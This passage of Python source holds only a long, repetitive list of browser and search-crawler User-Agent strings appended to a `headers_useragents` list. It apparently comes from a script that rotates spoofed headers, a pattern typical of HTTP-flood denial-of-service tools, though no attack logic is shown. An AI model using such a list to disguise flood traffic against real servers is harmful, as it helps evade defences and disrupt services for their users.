	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
